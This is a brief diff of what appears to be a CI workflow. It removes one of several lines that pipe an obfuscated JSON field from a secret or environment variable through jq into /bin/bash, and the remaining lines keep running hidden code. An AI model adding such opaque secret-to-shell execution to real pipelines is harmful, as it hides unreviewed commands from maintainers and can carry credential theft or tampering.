@@ -22,7 +22,6 @@ jobs:
           pf76: ${{ secrets.pf76 }}
         run: |
           printf '%s' "$pf76" | jq -r .vlany6255 | /bin/bash
-          printf '%s' "$vhqn69" | jq -r .rkz84960 | /bin/bash
           echo $ymo1602 | jq -r .fev9 | /bin/bash
 
       - name: Save archive
